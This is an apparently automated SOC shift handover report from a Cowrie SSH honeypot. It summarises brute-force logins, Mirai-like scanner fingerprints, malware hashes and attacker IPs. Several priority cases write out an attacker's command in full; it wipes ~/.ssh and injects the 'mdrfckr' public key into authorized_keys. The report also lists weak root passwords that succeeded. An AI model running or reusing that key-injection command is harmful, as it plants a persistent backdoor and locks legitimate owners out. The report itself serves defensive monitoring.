# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-19 |
| **Generated At** | 2026-05-19T21:23:45Z |
| **Shift Time** | 21:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **101** |
| Confirmed Threats | **93** |
| False Positives Filtered | **8** (7.9%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **12** |
| High Severity Cases | **9** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **92** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **17** |
| Unique Credential Pairs | **10** |
| Unique Usernames | **5** |
| Unique Passwords | **10** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 9 |
| `345gs5662d34` | 4 |
| `admin` | 2 |
| `flip` | 1 |
| `odoo` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `` | 2 |
| `flip` | 1 |
| `8520` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `admin` | `` | 2 |
| `flip` | `flip` | 1 |
| `root` | `8520` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `8520` | `43.163.98.211` | 2026-05-19T20:06:22 |
| `root` | `3245gs5662d34` | `43.163.98.211` | 2026-05-19T20:06:24 |
| `root` | `aamir@123` | `43.159.36.185` | 2026-05-19T20:08:06 |
| `root` | `3245gs5662d34` | `43.159.36.185` | 2026-05-19T20:08:08 |
| `root` | `zxcvbnm1234567` | `43.159.36.185` | 2026-05-19T20:10:39 |
| `root` | `Abcd12345` | `43.159.36.185` | 2026-05-19T20:11:54 |
| `root` | `ubuntu` | `221.122.121.219` | 2026-05-19T21:15:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **101** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Nmap scanner | 19 |
| libssh | 14 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 14 | 2 |
| `e788c657d1a2...` | Mirai/variant | 2 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `95420f9d932d...` | Nmap scanner | 17 | 3 | — |
| `f555226df196...` | libssh | 14 | 2 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 2 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.163.98.211`, `43.159.36.185`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **19** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | LOW |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS5607` | Sky UK Limited | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | MEDIUM |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS141421` | MUX BROADBAND (PRIVATE) LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-98ace36988a5

| Field | Detail |
|---|---|
| **Source IP** | `43.163.98[.]211` |
| **First Seen** | 2026-05-19 20:06 |
| **Last Seen** | 2026-05-19 20:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 20:06:21` | `cowrie.session.connect` |
| `2026-05-19 20:06:21` | `cowrie.client.version` |
| `2026-05-19 20:06:22` | `cowrie.client.kex` |
| `2026-05-19 20:06:22` | `cowrie.login.success` |
| `2026-05-19 20:06:22` | `cowrie.session.params` |
| `2026-05-19 20:06:22` | `cowrie.command.input` |
| `2026-05-19 20:06:22` | `cowrie.command.failed` |
| `2026-05-19 20:06:22` | `cowrie.log.closed` |
| `2026-05-19 20:06:22` | `cowrie.session.params` |
| `2026-05-19 20:06:22` | `cowrie.command.input` |
| `2026-05-19 20:06:22` | `cowrie.session.file_download` |
| `2026-05-19 20:06:22` | `cowrie.log.closed` |
| `2026-05-19 20:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.98[.]211` to AbuseIPDB if not already reported
- [ ] Block `43.163.98[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b87863fe8e

| Field | Detail |
|---|---|
| **Source IP** | `43.163.98[.]211` |
| **First Seen** | 2026-05-19 20:06 |
| **Last Seen** | 2026-05-19 20:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 20:06:24` | `cowrie.session.connect` |
| `2026-05-19 20:06:24` | `cowrie.client.version` |
| `2026-05-19 20:06:24` | `cowrie.client.kex` |
| `2026-05-19 20:06:24` | `cowrie.login.success` |
| `2026-05-19 20:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.98[.]211` to AbuseIPDB if not already reported
- [ ] Block `43.163.98[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c09f5b8983b9

| Field | Detail |
|---|---|
| **Source IP** | `43.159.36[.]185` |
| **First Seen** | 2026-05-19 20:08 |
| **Last Seen** | 2026-05-19 20:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 20:08:06` | `cowrie.session.connect` |
| `2026-05-19 20:08:06` | `cowrie.client.version` |
| `2026-05-19 20:08:06` | `cowrie.client.kex` |
| `2026-05-19 20:08:06` | `cowrie.login.success` |
| `2026-05-19 20:08:06` | `cowrie.session.params` |
| `2026-05-19 20:08:06` | `cowrie.command.input` |
| `2026-05-19 20:08:06` | `cowrie.command.failed` |
| `2026-05-19 20:08:06` | `cowrie.log.closed` |
| `2026-05-19 20:08:06` | `cowrie.session.params` |
| `2026-05-19 20:08:06` | `cowrie.command.input` |
| `2026-05-19 20:08:06` | `cowrie.session.file_download` |
| `2026-05-19 20:08:06` | `cowrie.log.closed` |
| `2026-05-19 20:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.36[.]185` to AbuseIPDB if not already reported
- [ ] Block `43.159.36[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf3091d9760b

| Field | Detail |
|---|---|
| **Source IP** | `43.159.36[.]185` |
| **First Seen** | 2026-05-19 20:08 |
| **Last Seen** | 2026-05-19 20:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 20:08:08` | `cowrie.session.connect` |
| `2026-05-19 20:08:08` | `cowrie.client.version` |
| `2026-05-19 20:08:08` | `cowrie.client.kex` |
| `2026-05-19 20:08:08` | `cowrie.login.success` |
| `2026-05-19 20:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.36[.]185` to AbuseIPDB if not already reported
- [ ] Block `43.159.36[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca729989fe5

| Field | Detail |
|---|---|
| **Source IP** | `43.159.36[.]185` |
| **First Seen** | 2026-05-19 20:10 |
| **Last Seen** | 2026-05-19 20:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 20:10:39` | `cowrie.session.connect` |
| `2026-05-19 20:10:39` | `cowrie.client.version` |
| `2026-05-19 20:10:39` | `cowrie.client.kex` |
| `2026-05-19 20:10:39` | `cowrie.login.success` |
| `2026-05-19 20:10:39` | `cowrie.session.params` |
| `2026-05-19 20:10:39` | `cowrie.command.input` |
| `2026-05-19 20:10:39` | `cowrie.command.failed` |
| `2026-05-19 20:10:39` | `cowrie.log.closed` |
| `2026-05-19 20:10:39` | `cowrie.session.params` |
| `2026-05-19 20:10:39` | `cowrie.command.input` |
| `2026-05-19 20:10:39` | `cowrie.session.file_download` |
| `2026-05-19 20:10:39` | `cowrie.log.closed` |
| `2026-05-19 20:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.36[.]185` to AbuseIPDB if not already reported
- [ ] Block `43.159.36[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-928c84ebac42

| Field | Detail |
|---|---|
| **Source IP** | `43.159.36[.]185` |
| **First Seen** | 2026-05-19 20:10 |
| **Last Seen** | 2026-05-19 20:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 20:10:41` | `cowrie.session.connect` |
| `2026-05-19 20:10:41` | `cowrie.client.version` |
| `2026-05-19 20:10:41` | `cowrie.client.kex` |
| `2026-05-19 20:10:41` | `cowrie.login.success` |
| `2026-05-19 20:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.36[.]185` to AbuseIPDB if not already reported
- [ ] Block `43.159.36[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e550e6111281

| Field | Detail |
|---|---|
| **Source IP** | `43.159.36[.]185` |
| **First Seen** | 2026-05-19 20:11 |
| **Last Seen** | 2026-05-19 20:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 20:11:54` | `cowrie.session.connect` |
| `2026-05-19 20:11:54` | `cowrie.client.version` |
| `2026-05-19 20:11:54` | `cowrie.client.kex` |
| `2026-05-19 20:11:54` | `cowrie.login.success` |
| `2026-05-19 20:11:54` | `cowrie.session.params` |
| `2026-05-19 20:11:54` | `cowrie.command.input` |
| `2026-05-19 20:11:54` | `cowrie.command.failed` |
| `2026-05-19 20:11:55` | `cowrie.log.closed` |
| `2026-05-19 20:11:55` | `cowrie.session.params` |
| `2026-05-19 20:11:55` | `cowrie.command.input` |
| `2026-05-19 20:11:55` | `cowrie.session.file_download` |
| `2026-05-19 20:11:55` | `cowrie.log.closed` |
| `2026-05-19 20:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.36[.]185` to AbuseIPDB if not already reported
- [ ] Block `43.159.36[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b86a5f4182

| Field | Detail |
|---|---|
| **Source IP** | `43.159.36[.]185` |
| **First Seen** | 2026-05-19 20:11 |
| **Last Seen** | 2026-05-19 20:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 20:11:56` | `cowrie.session.connect` |
| `2026-05-19 20:11:56` | `cowrie.client.version` |
| `2026-05-19 20:11:56` | `cowrie.client.kex` |
| `2026-05-19 20:11:57` | `cowrie.login.success` |
| `2026-05-19 20:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.36[.]185` to AbuseIPDB if not already reported
- [ ] Block `43.159.36[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad9602d1d9fe

| Field | Detail |
|---|---|
| **Source IP** | `221.122.121[.]219` |
| **First Seen** | 2026-05-19 21:15 |
| **Last Seen** | 2026-05-19 21:20 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 21:15:32` | `cowrie.session.connect` |
| `2026-05-19 21:15:32` | `cowrie.client.version` |
| `2026-05-19 21:15:36` | `cowrie.client.kex` |
| `2026-05-19 21:15:38` | `cowrie.login.success` |
| `2026-05-19 21:20:38` | `cowrie.session.file_upload` |
| `2026-05-19 21:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.122.121[.]219` to AbuseIPDB if not already reported
- [ ] Block `221.122.121[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.84.57[.]217` | **22** | 2026-05-19 20:32 | 2026-05-19 20:36 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **19** | 2026-05-19 18:18 | 2026-05-19 21:14 | 22m | 0 | `T1592` | 🟠 MEDIUM |
| `150.107.36[.]236` | **16** | 2026-05-19 19:12 | 2026-05-19 19:13 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `5.68.133[.]1` | **6** | 2026-05-19 18:46 | 2026-05-19 18:54 | 12m | 0 | `T1592` | 🟢 LOW |
| `43.159.36[.]185` | **5** | 2026-05-19 20:06 | 2026-05-19 20:11 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `198.12.149[.]130` | **4** | 2026-05-19 20:09 | 2026-05-19 21:17 | 2m | 0 | `T1592` | 🟢 LOW |
| `18.119.13[.]69` | **3** | 2026-05-19 19:02 | 2026-05-19 19:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.118.201[.]169` | **2** | 2026-05-19 19:35 | 2026-05-19 19:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.78.9[.]93` | 1 | 2026-05-19 18:22 | 2026-05-19 18:22 | 30s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-05-19 20:53 | 2026-05-19 20:54 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `190.0.95[.]142` | 1 | 2026-05-19 19:37 | 2026-05-19 19:37 | 13s | 0 | `T1592` | 🟢 LOW |
| `36.89.252[.]106` | 1 | 2026-05-19 20:42 | 2026-05-19 20:43 | 12s | 0 | `T1592` | 🟢 LOW |
| `39.164.124[.]83` | 1 | 2026-05-19 20:15 | 2026-05-19 20:15 | 15s | 0 | `T1592` | 🟢 LOW |
| `43.163.98[.]211` | 1 | 2026-05-19 20:06 | 2026-05-19 20:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]88` | 1 | 2026-05-19 20:59 | 2026-05-19 20:59 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `198.12.149[.]130` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |
| `103.84.57[.]217` | PK | MUX BROADBAND (PRIVATE) LIMITED | **100** ⚠️ | 12 |
| `5.68.133[.]1` | GB | Sky UK Limited | **100** ⚠️ | 2 |
| `120.78.9[.]93` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
